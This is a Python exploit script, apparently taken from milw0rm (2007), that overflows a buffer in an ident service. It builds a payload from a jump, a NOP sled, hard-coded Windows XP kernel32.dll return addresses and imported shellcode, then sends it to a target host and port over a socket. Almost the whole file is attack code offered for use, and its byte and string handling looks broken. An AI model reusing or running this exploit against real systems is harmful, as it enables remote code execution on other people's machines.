import socket
import sys
import time


from payload import buf

import struct
def shell_attack(target_machine, target_port): 
    target = target_machine
    port = target_port
    #jmp into nop sled
    payload  = '\xeb\x20'  
    #ident crap
    payload += ', 28 : USERID : UNIX : '
    #nop sled
    payload +='XXXX'
    # jmp *%esi
    payload += '\x77\x13\x83\x7c'  #XP kernel32.dll
    #payload += '\xb1\x63\xd9\x77' #W2K rpcrt4.dll
    #metasploit alphanumeric shellcode calc.exe
    

    nopsize=523-len(payload)-len(buf)
    nopsled=''
    for i in range(nopsize):
        nopsled+='\x90'
    payload=payload.replace('XXXX',str(nopsled)+str(buf))
    payload = payload.encode('utf-8')
    print(type(payload))

    try:
       
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port ))
        s.send(payload+'\n')
        s.close()
       
    except:
        pass

# milw0rm.com [2007-05-14]